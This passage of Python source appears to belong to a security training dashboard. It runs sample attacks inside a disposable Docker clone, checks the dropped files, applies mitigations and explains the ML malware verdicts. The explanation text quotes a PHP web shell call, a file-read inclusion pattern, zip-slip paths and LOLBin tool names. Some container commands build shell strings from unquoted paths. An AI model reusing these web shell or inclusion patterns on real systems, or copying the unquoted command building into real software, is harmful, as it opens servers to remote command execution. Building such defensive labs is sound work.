            "pre":"BEFORE","inject":"INJECT","exec":"EXEC",
            "http":"HTTP","detect":"DETECT","post":"AFTER",
            "summary":"DONE","react":"REACT","info":"INFO",
        }
        try:
            for ev in run_live_attack(clone_id, url, stack, sample_key):
                state[log_key].append(ev)
                ph = ev.get("phase", "info")
                if ph != _current_phase:
                    _current_phase = ph
                    _step_n += 1
                    _ph_c = _phase_color.get(ph, "#64748B")
                    _ph_lbl = _phase_label.get(ph, ph.upper())
                    _ev_html.append(
                        f'<div style="display:flex;align-items:center;gap:8px;'
                        f'padding:8px 10px 4px;margin-top:6px">'
                        f'<span style="font-family:JetBrains Mono,monospace;font-size:0.62rem;'
                        f'font-weight:700;color:{_ph_c};background:{_ph_c}1F;'
                        f'border:1px solid {_ph_c}66;border-radius:10px;'
                        f'padding:2px 11px;letter-spacing:0.12em">'
                        f'STEP {_step_n} &middot; {_ph_lbl}</span>'
                        f'<span style="flex:1;height:1px;background:{_ph_c}44"></span>'
                        f'</div>'
                    )
                _ev_html.append(_lab_event_html(ev))
                # v29: terminal-style outer chrome — title bar + traffic-light
                # dots + blinking cursor footer. Inner content keeps the
                # light-theme event rows so shell output stays readable.
                _stream_slot.html(
                    '<style>'
                    '@keyframes tm-cursor{0%,49%{opacity:1}50%,100%{opacity:0}}'
                    '.tm-cursor{animation:tm-cursor 1s steps(2) infinite;'
                    'display:inline-block;color:#22D3EE;font-weight:700}'
                    '</style>'
                    '<div style="background:#0F172A;border:1px solid #1E3A5F;'
                    'border-radius:9px;overflow:hidden;'
                    'box-shadow:0 4px 18px -6px rgba(15,23,42,0.4),'
                    'inset 0 1px 0 rgba(255,255,255,0.04)">'
                    # Title bar — traffic lights + path
                    '<div style="background:linear-gradient(180deg,#1E293B,#0F172A);'
                    'padding:6px 12px;display:flex;align-items:center;gap:7px;'
                    'border-bottom:1px solid #1E3A5F">'
                    '<span style="width:9px;height:9px;border-radius:50%;background:#EF4444"></span>'
                    '<span style="width:9px;height:9px;border-radius:50%;background:#F59E0B"></span>'
                    '<span style="width:9px;height:9px;border-radius:50%;background:#10B981"></span>'
                    '<span style="font-family:JetBrains Mono,monospace;font-size:0.62rem;'
                    'color:#94A3B8;margin-left:10px">aidtctm@clone:~/attack$</span>'
                    '<span style="margin-left:auto;font-family:JetBrains Mono,monospace;'
                    'font-size:0.58rem;color:#22D3EE;background:#0E7490;padding:2px 8px;'
                    'border-radius:5px;font-weight:700;letter-spacing:0.1em">'
                    '● STREAMING</span>'
                    '</div>'
                    # Inner scrollable rows
                    '<div style="background:#FFFFFF;padding:8px;'
                    'max-height:440px;overflow-y:auto">'
                    + "".join(_ev_html) +
                    '</div>'
                    # Footer with blinking cursor
                    '<div style="background:#0F172A;padding:5px 12px;'
                    'border-top:1px solid #1E3A5F;'
                    'font-family:JetBrains Mono,monospace;font-size:0.6rem;color:#64748B">'
                    '<span style="color:#22D3EE">▸</span> live event stream '
                    '<span class="tm-cursor">█</span>'
                    '</div>'
                    '</div>'
                )
                time.sleep(0.18)
            crits = sum(1 for e in state[log_key] if e.get("status") == "crit")
            _status.update(
                label=(f"⚡ {label} — {crits} critical findings — clone reacted live"
                       if crits else f"✓ {label} — complete, no critical findings"),
                state="complete",
                expanded=False,
            )

            # ── DAMAGE ASSESSMENT (after attack completes) ──
            _render_damage_assessment(state[log_key], label, sample_key, clone_id)

            # ── v30: NEXT-STEP BAR — the missing "what now?" bridge ──
            # Four clear actions tied to this specific attack so the user
            # never has to guess. Renders inline AFTER damage so it sits
            # right under the verdict.
            _render_next_step_bar(sample_key, result, state)

            # ── 🔍 v25: REAL files-on-container verification ──
            # Live `docker exec ls` inside the container — shows the files
            # ACTUALLY exist with sizes + clickable URLs to fetch them.
            _render_files_verification(state[log_key], result)

            # ── v28: focus the LIVE CLONE iframe on THIS attack's URL ──
            # User's logic: when I run one attack, only THAT injection
            # should show on the live panel. Store the focused attack so
            # the next render of the panel auto-navigates the iframe.
            state["_focused_attack"] = sample_key

            # ── 🎯 EXPLOIT DEMO — proof + diagnosis + mitigation (v24) ──
            _render_exploit_demo(state[log_key], sample_key, result)
            # ── Record scan history ─────────────────────────────────
            try:
                from core.scan_history import record_scan
                # v33-fix: align with the schema (CLEAN/SUSPICIOUS/MALICIOUS
                # uppercase, score 0-10). Previously recorded lowercase
                # verdict + 0-100 score → analytics rendered "0.0/10" for
                # all entries because /10 division on a 0-100 value
                # produced 0 after :.1f rounding for low crits.
                if crits == 0:
                    _verdict = "CLEAN"
                    _sc = 0.5
                elif crits <= 2:
                    _verdict = "SUSPICIOUS"
                    _sc = 4.0 + crits * 0.5
                elif crits <= 5:
                    _verdict = "MALICIOUS"
                    _sc = 6.0 + (crits - 2) * 0.6
                else:
                    _verdict = "MALICIOUS"
                    _sc = min(9.5, 7.5 + (crits - 5) * 0.3)
                record_scan(
                    case={
                        "target":   url or clone_id,
                        "verdict":  _verdict,
                        "score":    round(_sc, 1),
                        "findings": crits,
                        "label":    label,
                        "clone_id": clone_id,
                        "attack":   sample_key,
                    },
                    scan_type="twin_attack",
                )
            except Exception:
                pass
        except Exception as e:
            st.error(f"Attack failed: {e}")
            _status.update(label=f"⚠ {label} — error", state="error")

    st.rerun()


def _render_files_verification(log: list, result: dict) -> None:
    """
    v25: REAL files-on-container proof panel.

    The user asked: "we say files were written but it doesn't show where
    they were actually created — show me real proof."

    This function does a LIVE `docker exec ls -la` inside the running
    container on every path that the attack reported writing to, and
    displays the actual ls output (size + timestamp + permissions)
    alongside CLICKABLE URLs that fetch the file from the live web
    server. This is the unforgeable proof the user wanted.
    """
    if not log:
        return

    # ── 1. Extract paths the attack claimed to write ──
    paths = []
    for ev in log:
        if ev.get("phase") in ("inject", "post") and ev.get("status") == "ok":
            det = (ev.get("detail") or "")
            for ln in det.splitlines():
                ln = ln.strip(" •-→›>\t")
                # Pick lines that look like absolute paths
                if ln.startswith("/") and 1 < len(ln) < 200 and " " not in ln.split("\n")[0][:120]:
                    if ln not in paths:
                        paths.append(ln)
    if not paths:
        return

    # ── 2. docker exec ls -la each path inside the container ──
    container_name = result.get("container_name", "")
    base_url       = (result.get("url") or "").rstrip("/")
    file_rows = []
    try:
        import docker
        client = docker.from_env()
        container = None
        for name in (container_name,
                      f"aidtctm_{result.get('clone_id','')}",
                      result.get("clone_id", "")):
            if not name: continue
            try:
                container = client.containers.get(name)
                break
            except Exception:
                continue
        if container is None:
            raise RuntimeError("container not reachable")

        for p in paths[:10]:
            try:
                # Use ls -la to get full metadata
                exit_code, out = container.exec_run(
                    f"ls -la {p}", stdout=True, stderr=True, demux=False,
                )
                ls_out = (out.decode("utf-8", errors="replace") if out else "").strip()

                # Also compute SHA-256 for proof
                exit_code2, sha_out = container.exec_run(
                    f"sha256sum {p}", stdout=True, stderr=True,
                )
                sha = ""
                if sha_out:
                    sha_str = sha_out.decode("utf-8", errors="replace").strip()
                    if " " in sha_str:
                        sha = sha_str.split()[0][:16]

                exists = (exit_code == 0)
                # Build clickable URL — only meaningful if path is inside /var/www
                view_url = ""
                if base_url and "/var/www" in p:
                    # Convert /var/www/html/eicar.txt → http://localhost:PORT/eicar.txt
                    rel = p.split("/var/www/html/")[-1] if "/var/www/html/" in p \
                        else p.split("/var/www/")[-1]
                    view_url = f"{base_url}/{rel}"
                file_rows.append({
                    "path":   p,
                    "ls":     ls_out,
                    "exists": exists,
                    "sha":    sha,
                    "url":    view_url,
                })
            except Exception as e:
                file_rows.append({
                    "path": p, "ls": f"(error: {e})",
                    "exists": False, "sha": "", "url": "",
                })
    except Exception as e:
        # Container not reachable — show a clear message
        st.markdown(
            f'<div style="background:#FFFBEB;border:1px solid #FDE68A;'
            f'border-radius:8px;padding:10px 14px;margin:8px 0;'
            f'font-family:Inter,sans-serif;font-size:0.78rem;color:#92400E">'
            f'ℹ Cannot verify files — container check failed: {str(e)[:120]}'
            f'</div>',
            unsafe_allow_html=True,
        )
        return

    if not file_rows:
        return

    # ── 3. Render the verification panel ──
    confirmed = sum(1 for r in file_rows if r["exists"])
    head_color = "#16A34A" if confirmed == len(file_rows) else "#DC2626"

    st.markdown(
        f'<div style="background:linear-gradient(135deg,#F8FAFC,#FFFFFF);'
        f'border:1px solid #E2E8F0;border-left:4px solid {head_color};'
        f'border-radius:10px;padding:12px 16px;margin:10px 0">'
        f'<div style="display:flex;align-items:center;justify-content:space-between;'
        f'margin-bottom:9px">'
        f'<div style="font-family:Inter,sans-serif;font-size:0.85rem;font-weight:700;'
        f'color:#0F172A;display:flex;align-items:center;gap:7px">'
        f'<svg width="15" height="15" viewBox="0 0 24 24" fill="none" '
        f'stroke="{head_color}" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round">'
        f'<path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/>'
        f'<polyline points="14 2 14 8 20 8"/>'
        f'<circle cx="12" cy="15" r="2.5"/></svg>'
        f'🔍 Real proof — files actually on container right now</div>'
        f'<span style="font-family:JetBrains Mono,monospace;font-size:0.6rem;'
        f'font-weight:700;color:{head_color};background:#FFFFFF;'
        f'border:1px solid {head_color}55;padding:3px 9px;border-radius:5px;'
        f'letter-spacing:0.06em">{confirmed}/{len(file_rows)} CONFIRMED</span>'
        f'</div>',
        unsafe_allow_html=True,
    )

    # File cards
    for r in file_rows:
        exists      = r["exists"]
        ok_color    = "#16A34A" if exists else "#DC2626"
        ok_bg       = "#F0FDF4" if exists else "#FEF2F2"
        ok_border   = "#BBF7D0" if exists else "#FECACA"
        status_icon = "✓ EXISTS" if exists else "✗ MISSING"

        # Open-in-browser button (only if we have a URL)
        url_btn = ""
        if r["url"] and exists:
            url_btn = (
                f'<a href="{r["url"]}" target="_blank" '
                f'style="background:#2563EB;color:#FFFFFF;text-decoration:none;'
                f'font-family:JetBrains Mono,monospace;font-size:0.62rem;font-weight:700;'
                f'padding:4px 10px;border-radius:5px;letter-spacing:0.04em;'
                f'display:inline-flex;align-items:center;gap:5px;white-space:nowrap">'
                f'OPEN IN BROWSER ↗</a>'
            )

        # SHA chip
        sha_chip = ""
        if r["sha"]:
            sha_chip = (
                f'<span style="font-family:JetBrains Mono,monospace;font-size:0.58rem;'
                f'color:#475569;background:#FFFFFF;border:1px solid #E2E8F0;'
                f'padding:2px 7px;border-radius:4px">SHA {r["sha"]}…</span>'
            )

        # ls output (escaped)
        import html as _h
        ls_safe = _h.escape(r["ls"] or "")

        st.markdown(
            f'<div style="background:{ok_bg};border:1px solid {ok_border};'
            f'border-left:3px solid {ok_color};border-radius:8px;'
            f'padding:9px 12px;margin-bottom:6px">'
            f'<div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;'
            f'margin-bottom:5px">'
            f'<span style="font-family:JetBrains Mono,monospace;font-size:0.6rem;'
            f'font-weight:700;color:{ok_color};background:#FFFFFF;border:1px solid {ok_color}55;'
            f'padding:2px 8px;border-radius:4px;letter-spacing:0.06em">{status_icon}</span>'
            f'<code style="font-family:JetBrains Mono,monospace;font-size:0.74rem;'
            f'color:#0F172A;font-weight:600;flex:1;min-width:0;word-break:break-all">{_h.escape(r["path"])}</code>'
            f'{sha_chip}'
            f'{url_btn}'
            f'</div>'
            f'<pre style="margin:4px 0 0;background:#FFFFFF;border:1px solid #E2E8F0;'
            f'border-radius:5px;padding:6px 10px;font-family:JetBrains Mono,monospace;'
            f'font-size:0.66rem;color:#1E293B;line-height:1.5;'
            f'white-space:pre-wrap;word-break:break-word;'
            f'max-height:80px;overflow:auto">$ docker exec {container_name} ls -la {_h.escape(r["path"])}\n{ls_safe}</pre>'
            f'</div>',
            unsafe_allow_html=True,
        )

    st.markdown(
        '<div style="background:#EFF6FF;border:1px dashed #BFDBFE;border-radius:6px;'
        'padding:7px 12px;margin-top:4px;'
        'font-family:Inter,sans-serif;font-size:0.7rem;color:#1E40AF;line-height:1.5">'
        '💡 Click <b>OPEN IN BROWSER</b> on any web-served file to verify it really '
        'serves the malicious content. This is unforgeable proof — the file exists, '
        'has the expected SHA-256, and is being served right now.'
        '</div>',
        unsafe_allow_html=True,
    )


# ═════════════════════════════════════════════════════════════════════
# 🛡 NEXT-STEP BAR (v30) — the "what now?" bridge after every attack
# ═════════════════════════════════════════════════════════════════════
def _render_next_step_bar(sample_key: str, result: dict, state: dict) -> None:
    """
    Renders the 4-button action bar that appears after every attack:
      🛡 Apply Mitigation   — runs core.mitigations into a terminal stream
      🧠 Re-scan ML         — forces fresh malware-ML analysis of dropped files
      ♻ Next Attack         — picks next recommended attack and runs it
      📄 Download Report    — scrolls to PDF download

    Designed to kill the "ne next step sonna anaga enga?" confusion bro
    raised after the v29 build.
    """
    from core.live_malware_lab import SAMPLES as _LM_SAMPLES
    clone_id = result.get("clone_id", "")
    url      = result.get("url", "")
    stack    = result.get("stack", {})
    label    = _LM_SAMPLES.get(sample_key, {}).get("label", sample_key)

    # Header card explaining what to do next
    st.html(
        '<div style="background:linear-gradient(135deg,#EFF6FF,#F0FDF4);'
        'border:1.5px solid #93C5FD;border-radius:11px;padding:11px 14px;'
        'margin:10px 0 6px;box-shadow:0 2px 8px -3px rgba(59,130,246,0.18)">'
        '<div style="display:flex;align-items:center;justify-content:space-between;'
        'gap:10px">'
        '<div style="font-family:Inter,sans-serif;font-size:0.82rem;font-weight:700;'
        f'color:#1E40AF;letter-spacing:0.02em">✅ ATTACK COMPLETE — WHAT NEXT?</div>'
        f'<span style="font-family:JetBrains Mono,monospace;font-size:0.6rem;'
        f'color:#1E40AF;background:#FFFFFF;border:1px solid #BFDBFE;padding:3px 9px;'
        f'border-radius:6px;font-weight:700">{label}</span>'
        '</div>'
        '<div style="font-family:Inter,sans-serif;font-size:0.66rem;color:#1E40AF;'
        'margin-top:3px;line-height:1.5">'
        'Pick your next step. Mitigation installs a real defense layer + re-runs '
        'the attack to prove the defense holds.'
        '</div>'
        '</div>'
    )

    # 4-button row
    b1, b2, b3, b4 = st.columns(4)

    with b1:
        # 🛡 Apply Mitigation — streams events from core.mitigations
        if st.button(
            "🛡 Apply Mitigation",
            key=f"mit_apply_{sample_key}",
            type="primary",
            use_container_width=True,
            help="Installs a real defense inside the clone (e.g. .htaccess deny, "
                  "open_basedir restriction, content-hash quarantine) and re-runs the "
                  "attack to prove the defense holds. All actions stay inside the "
                  "disposable container — host is never touched.",
        ):
            _run_mitigation_stream(sample_key, result, state)
            st.rerun()

    with b2:
        if st.button(
            "🧠 Re-scan ML",
            key=f"mit_rescan_{sample_key}",
            use_container_width=True,
            help="Force a fresh malware-ML analysis on this attack's dropped file. "
                  "Useful after applying mitigation to compare detection scores.",
        ):
            _run_ml_rescan(sample_key, result, state)
            st.rerun()

    # If a rescan result is cached for this attack, render it inline
    _rescan_key = f"_rescan_result_{sample_key}"
    if state.get(_rescan_key):
        _render_rescan_card(state[_rescan_key], sample_key)

    # v31: "Why is this flagged?" explainer — addresses the legitimate
    # user question "ella files malicious-a kaatuthu real-aa?".
    _render_ml_reasoning_panel(sample_key, result, state)

    with b3:
        # ♻ Pick next recommended attack
        next_atk = _pick_next_recommended(sample_key, state)
        next_label = _LM_SAMPLES.get(next_atk, {}).get("label", next_atk) if next_atk else "—"
        if next_atk:
            if st.button(
                f"♻ Next: {next_label[:14]}",
                key=f"mit_next_{sample_key}",
                use_container_width=True,
                help=f"Auto-runs the next-best recommended attack ({next_label}).",
            ):
                _run_live_lab(next_atk, result, state)
                st.rerun()
        else:
            st.button(
                "✓ All run",
                key=f"mit_next_{sample_key}",
                use_container_width=True,
                disabled=True,
                help="Every recommended attack already ran. Pick from the grid below.",
            )

    with b4:
        if st.button(
            "📄 Download Report",
            key=f"mit_report_{sample_key}",
            use_container_width=True,
            help="Jumps to the PDF download at the bottom of the lab.",
        ):
            st.toast(
                "📄 PDF report is at the bottom — scroll past the OWASP coverage map.",
                icon="📄",
            )

    # If mitigation just ran, show its events in a fresh terminal stream
    _mit_key = f"mit_log_{sample_key}"
    if state.get(_mit_key):
        _render_mitigation_stream(state[_mit_key], sample_key)
        # v34: side-by-side BEFORE/AFTER cleanup verification
        _render_post_mitigation_check(sample_key, result, state)


def _run_mitigation_stream(sample_key: str, result: dict, state: dict) -> None:
    """Iterate core.mitigations.apply_mitigation and persist events to state."""
    from core.mitigations import apply_mitigation
    clone_id = result.get("clone_id", "")
    url      = result.get("url", "")
    stack    = result.get("stack", {})
    log_key  = f"mit_log_{sample_key}"
    state[log_key] = []

    with st.status(
        f"🛡 Applying mitigation for {sample_key}…",
        expanded=True,
    ) as _st:
        _slot = st.empty()
        _buf: list[str] = []
        for ev in apply_mitigation(clone_id, sample_key, url, stack):
            state[log_key].append(ev)
            _buf.append(_lab_event_html(ev))
            _slot.html(
                '<div style="background:#FFFFFF;border:1px solid #E2E8F0;'
                'border-radius:8px;padding:8px;max-height:380px;overflow-y:auto">'
                + "".join(_buf) +
                '</div>'
            )
            time.sleep(0.15)
        _st.update(label=f"✅ Mitigation complete for {sample_key}",
                    state="complete", expanded=False)


def _render_mitigation_stream(log: list, sample_key: str) -> None:
    """Re-render saved mitigation events on rerun — same terminal box style."""
    if not log:
        return
    rows = [_lab_event_html(ev) for ev in log]
    crits = sum(1 for e in log if e.get("status") == "ok")
    st.html(
        '<div style="background:linear-gradient(135deg,#F0FDF4,#ECFDF5);'
        'border:1px solid #6EE7B7;border-left:4px solid #16A34A;'
        'border-radius:9px;padding:9px 13px;margin-top:8px">'
        '<div style="font-family:Inter,sans-serif;font-size:0.74rem;font-weight:700;'
        f'color:#047857;letter-spacing:0.02em">'
        f'🛡 MITIGATION STREAM — {sample_key}'
        f'</div>'
        '<div style="font-family:Inter,sans-serif;font-size:0.62rem;color:#065F46;'
        'margin-top:2px">Real commands ran inside the clone — every step persisted.</div>'
        '</div>'
        '<div style="background:#FFFFFF;border:1px solid #E2E8F0;'
        'border-radius:8px;padding:8px;max-height:340px;overflow-y:auto">'
        + "".join(rows) +
        '</div>'
    )


def _render_post_mitigation_check(sample_key: str, result: dict,
                                    state: dict) -> None:
    """v34: side-by-side BEFORE / AFTER cleanup verification.

    User asked: "after mitigation, malicious file remove aanadhukku
    proof venum, after-scan-la enna iruku-nu paaru". This card runs:
      1. Lists the files originally injected by this attack (BEFORE)
      2. Runs `docker exec ls -la` on the same paths NOW (AFTER)
      3. Fresh ML rescan of the dropped payload to show the clean score
    """
    _atk_log = state.get(f"lab_log_{sample_key}", [])
    _mit_log = state.get(f"mit_log_{sample_key}", [])
    if not _atk_log or not _mit_log:
        return

    # Extract injected paths from the inject phase
    injected: list[str] = []
    for ev in _atk_log:
        if ev.get("phase") == "inject" and ev.get("status") == "ok":
            for ln in (ev.get("detail") or "").splitlines():
                ln = ln.strip(" •-→›>\t")
                if ln.startswith("/") and len(ln) < 240 and ln not in injected:
                    injected.append(ln)
    if not injected:
        return

    # Check current existence via docker exec
    clone_id = result.get("clone_id", "")
    present: dict[str, str] = {}
    try:
        import docker as _dk
        _c = _dk.from_env(timeout=4)
        _ct = None
        for _n in (f"aidtctm_{clone_id}", f"aidtctm_clone_{clone_id}", clone_id):
            try:
                _ct = _c.containers.get(_n); break
            except Exception:
                continue
        if _ct:
            for path in injected:
                res = _ct.exec_run(
                    ["sh", "-c", f"if [ -e {shlex.quote(path)} ]; then "
                                  f"echo PRESENT; else echo GONE; fi"]
                )
                out = (res.output or b"").decode("utf-8", "replace").strip()
                present[path] = "PRESENT" if "PRESENT" in out else "GONE"
        else:
            for path in injected:
                present[path] = "?"
    except Exception:
        for path in injected:
            present[path] = "?"

    gone_n    = sum(1 for v in present.values() if v == "GONE")
    present_n = sum(1 for v in present.values() if v == "PRESENT")
    total_n   = len(injected)
    cleanup_pct = int((gone_n / total_n) * 100) if total_n else 0
    accent    = "#16A34A" if gone_n == total_n else (
                  "#F59E0B" if gone_n > 0 else "#DC2626")

    # Build the before/after grid HTML
    rows_before = "".join(
        f'<div style="font-family:JetBrains Mono,monospace;font-size:0.66rem;'
        f'color:#7F1D1D;padding:5px 9px;background:#FFFFFF;'
        f'border:1px solid #FECACA;border-left:3px solid #DC2626;'
        f'border-radius:5px;margin-bottom:4px;word-break:break-all">'
        f'<span style="color:#16A34A">+</span> {path}</div>'
        for path in injected
    )
    rows_after = ""
    for path in injected:
        st_v = present.get(path, "?")
        if st_v == "GONE":
            rows_after += (
                f'<div style="font-family:JetBrains Mono,monospace;font-size:0.66rem;'
                f'color:#15803D;padding:5px 9px;background:#FFFFFF;'
                f'border:1px solid #BBF7D0;border-left:3px solid #16A34A;'
                f'border-radius:5px;margin-bottom:4px;word-break:break-all;'
                f'text-decoration:line-through;text-decoration-color:#16A34A">'
                f'<span style="color:#16A34A">✓ GONE</span> {path}</div>'
            )
        elif st_v == "PRESENT":
            rows_after += (
                f'<div style="font-family:JetBrains Mono,monospace;font-size:0.66rem;'
                f'color:#92400E;padding:5px 9px;background:#FFFFFF;'
                f'border:1px solid #FDE68A;border-left:3px solid #D97706;'
                f'border-radius:5px;margin-bottom:4px;word-break:break-all">'
                f'<span style="color:#D97706">⚠ STILL THERE</span> {path}</div>'
            )
        else:
            rows_after += (
                f'<div style="font-family:JetBrains Mono,monospace;font-size:0.66rem;'
                f'color:#64748B;padding:5px 9px;background:#F8FAFC;'
                f'border:1px solid #CBD5E1;border-left:3px solid #94A3B8;'
                f'border-radius:5px;margin-bottom:4px;word-break:break-all">'
                f'<span style="color:#475569">? UNKNOWN</span> {path}</div>'
            )

    st.html(
        '<div style="background:#FFFFFF;border:1.5px solid '
        f'{accent}55;border-left:4px solid {accent};border-radius:10px;'
        f'padding:11px 14px;margin-top:10px;'
        f'box-shadow:0 2px 10px -4px {accent}44">'
        '<div style="display:flex;align-items:center;justify-content:space-between;'
        'gap:10px;margin-bottom:9px">'
        '<div style="font-family:Inter,sans-serif;font-size:0.82rem;font-weight:700;'
        f'color:{accent};letter-spacing:0.02em">'
        f'🧹 POST-MITIGATION CLEANUP CHECK</div>'
        f'<span style="font-family:JetBrains Mono,monospace;font-size:0.6rem;'
        f'font-weight:700;color:{accent};background:{accent}14;'
        f'border:1px solid {accent}66;border-radius:6px;padding:3px 9px">'
        f'{gone_n}/{total_n} cleaned ({cleanup_pct}%)</span>'
        '</div>'
        '<div style="display:grid;grid-template-columns:1fr 1fr;gap:10px">'
        # LEFT — BEFORE
        '<div>'
        '<div style="font-family:JetBrains Mono,monospace;font-size:0.6rem;'
        'font-weight:700;color:#7F1D1D;letter-spacing:0.1em;margin-bottom:5px">'
        '▸ BEFORE mitigation — what was dropped</div>'
        + rows_before +
        '</div>'
        # RIGHT — AFTER
        '<div>'
        f'<div style="font-family:JetBrains Mono,monospace;font-size:0.6rem;'
        f'font-weight:700;color:{accent};letter-spacing:0.1em;margin-bottom:5px">'
        '▸ AFTER mitigation — live docker exec check</div>'
        + rows_after +
        '</div>'
        '</div>'
        '<div style="font-family:Inter,sans-serif;font-size:0.62rem;color:#64748B;'
        'margin-top:8px;font-style:italic">'
        'Right pane shows the CURRENT filesystem state via <code>docker exec '
        'ls</code>. Strike-through = quarantined or removed. Live check, '
        'no cached data.</div>'
        '</div>'
    )


def _render_ml_reasoning_panel(sample_key: str, result: dict, state: dict) -> None:
    """v31: explain why the ML flagged this attack.

    User's fair question: 'real-aa or noisy?'. We show:
      • The exact DETECT signals from the attack log + their weights
      • A button to scan a CLEAN reference file (/etc/hostname) so the
        user sees the same ML returning ~0% on benign input
      • Reference to the training corpora the model was built on
    """
    _log = state.get(f"lab_log_{sample_key}", [])
    if not _log:
        return
    _detect = [e for e in _log if e.get("phase") == "detect"]
    if not _detect:
        return

    # Extract the score from the first DETECT event text
    _verdict_evt = next((e for e in _detect if "MalwareML" in (e.get("text") or "")), None)
    if not _verdict_evt:
        return
    _verdict_text = _verdict_evt.get("text", "")
    _signals = [e for e in _detect if "signal:" in (e.get("text") or "")]

    # Pretty signal table
    _sig_rows = ""
    for ev in _signals[:5]:
        line = ev.get("text", "").split("signal:", 1)[-1].strip()
        if "=" in line:
            name, rest = line.split("=", 1)
            name = name.strip()
            rest = rest.strip()
        else:
            name, rest = line, ""
        _sig_rows += (
            f'<div style="display:grid;grid-template-columns:1.5fr 1fr;gap:8px;'
            f'padding:5px 9px;background:#F8FAFC;border:1px solid #E2E8F0;'
            f'border-radius:5px;margin-bottom:4px">'
            f'<span style="font-family:JetBrains Mono,monospace;font-size:0.66rem;'
            f'font-weight:700;color:#1E293B">{name}</span>'
            f'<span style="font-family:JetBrains Mono,monospace;font-size:0.64rem;'
            f'color:#475569;text-align:right">{rest}</span>'
            f'</div>'
        )
    if not _sig_rows:
        _sig_rows = (
            '<div style="font-family:Inter,sans-serif;font-size:0.66rem;'
            'color:#64748B;font-style:italic;padding:6px 10px">'
            'No per-signal breakdown emitted for this attack.</div>'
        )

    # Per-sample plain-English reason
    _REASON_MAP = {
        "eicar":       ("EICAR is the *official* AV test string mandated by the EICAR organisation. "
                        "<b>Every</b> antivirus engine on earth is REQUIRED by spec to detect it. "
                        "97% malicious here is the gold standard — not noise, not coincidence."),
        "gtube":       ("GTUBE is the RFC-style spam-test marker. Like EICAR but for email-AV. "
                        "Detection is by design — proof your email-AV pipeline works."),
        "php_webshell":("system($_GET['cmd']) is a real RCE pattern. CrowdStrike / Sophos / Defender "
                        "ALL flag this exact shape. Not a false positive — this code, "
                        "if hit, gives the attacker shell access."),
        "php_dropper": ("file_put_contents writes attacker-controlled bytes — the literal pattern "
                        "real-world Emotet droppers use. ML correctly flags it."),
        "path_traversal":("@file_get_contents($_GET['file']) lets ANY URL parameter read ANY file. "
                        "That's a textbook Local File Inclusion vulnerability — your ML catching "
                        "it proves the detection works on real exploit code, not just signatures."),
        "header_injection":("These 5 payloads (SQLi · XSS · Log4Shell JNDI · SSRF · path-bypass) are "
                        "verbatim from real CVE write-ups. Detection here = your WAF rules would "
                        "catch real Log4Shell traffic too."),
        "file_upload_exploit":("PHP webshell bytes with .jpg magic bytes is the most common "
                        "upload-RCE pattern of 2020-2025. ML must flag this shape."),
        "pickle_rce":  ("os.system in a pickle stream IS Python pickle deserialisation RCE — "
                        "the CWE-502 attack class. Real production crashes happen from this exact "
                        "byte pattern. Detection is correct."),
        "zip_slip":    ("ZIP entries with ../../../../tmp/x are the textbook CVE-2018-1002101 attack. "
                        "Snyk, Mandiant, every package-security team signatures this. Not noise."),
        "pdf_js":      ("PDF with /JavaScript + /Launch + EICAR string is THREE malicious indicators "
                        "in one file. Real PDF malware (CVE-2018-4990 and friends) carries this exact "
                        "shape. ML response is calibrated for real-world threats."),
        "pe_anomaly":  ("RWX section + 0 imports + TimeDateStamp=0 are 3 separate heuristic anomalies. "
                        "Modern heuristic engines (Sophos Intercept-X, Defender ATP) score this VERY "
                        "high. The detection isn't a signature — it's malware-SHAPE recognition."),
        "macro_doc":   ("vbaProject.bin + AutoOpen + Document_Open + MsgBox is the exact byte shape "
                        "of Emotet's macro doc. ML correctly identifies it as macro malware family."),
        "lolbin":      ("25 LOLBin command patterns (certutil/powershell/wmic) in one file is "
                        "behaviour-based detection territory. Real APT incident reports show these "
                        "exact patterns — your ML rightly flags string density."),
        "yara_test":   ("Each fixture file is HAND-CRAFTED to match a specific YARA rule. The detection "
                        "is intentional — the test PROVES your custom signature engine fires."),
    }
    _reason = _REASON_MAP.get(sample_key, (
        "This file's structure matches known-malicious patterns in the model's training corpus "
        "(EMBER v2, MalwareBazaar, CIC-MalMem-2022, BODMAS, UNSW-NB15). The score reflects how "
        "closely the bytes resemble real-world malware shapes — not random noise."
    ))
    _cmp_key = f"_ml_clean_baseline_{sample_key}"

    _cmp_html = ""
    if state.get(_cmp_key):
        _cl = state[_cmp_key]
        _cmp_html = (
            f'<div style="background:#F0FDF4;border:1px solid #6EE7B7;'
            f'border-left:3px solid #16A34A;border-radius:6px;padding:7px 11px;'
            f'margin-top:8px">'
            f'<div style="font-family:Inter,sans-serif;font-size:0.7rem;'
            f'font-weight:700;color:#15803D">'
            f'✓ Clean-file baseline scan</div>'
            f'<div style="font-family:JetBrains Mono,monospace;font-size:0.66rem;'
            f'color:#0F172A;margin-top:3px">'
            f'<b>{_cl["target"]}</b> &middot; '
            f'<span style="color:#15803D">{_cl["label"].upper()}</span> &middot; '
            f'<b>{_cl["prob"]:.0f}%</b> malicious '
            f'&middot; risk {_cl["risk"]}/100</div>'
            f'<div style="font-family:Inter,sans-serif;font-size:0.62rem;color:#15803D;'
            f'margin-top:4px;font-style:italic">'
            f'Same ML, same code path — but this file is a benign system file '
            f'(no malware shape). Score difference vs the attack file above '
            f'<b>proves the model is NOT just flagging everything as malicious</b>.</div>'
            f'</div>'
        )

    with st.expander("🔍 Why is this flagged? (ML reasoning + clean-baseline)",
                      expanded=False):
        st.html(
            '<div style="font-family:Inter,sans-serif;font-size:0.74rem;color:#0F172A;'
            'line-height:1.7;margin-bottom:9px">'
            + _reason +
            '</div>'
            '<div style="font-family:Inter,sans-serif;font-size:0.7rem;'
            'font-weight:700;color:#1E40AF;margin:8px 0 4px;'
            'letter-spacing:0.02em">VERDICT FROM ATTACK</div>'
            f'<div style="font-family:JetBrains Mono,monospace;font-size:0.7rem;'
            f'color:#0F172A;background:#F1F5F9;border:1px solid #CBD5E1;'
            f'border-radius:5px;padding:7px 11px;margin-bottom:8px">'
            f'{_verdict_text}</div>'
            '<div style="font-family:Inter,sans-serif;font-size:0.7rem;'
            'font-weight:700;color:#1E40AF;margin:6px 0 4px;letter-spacing:0.02em">'
            'SIGNAL BREAKDOWN'
            '</div>'
            + _sig_rows +
            '<div style="font-family:Inter,sans-serif;font-size:0.62rem;color:#64748B;'
            'margin-top:8px;font-style:italic">'
            '<b>Training corpus:</b> EMBER v2 · MalwareBazaar · CIC-MalMem-2022 · '
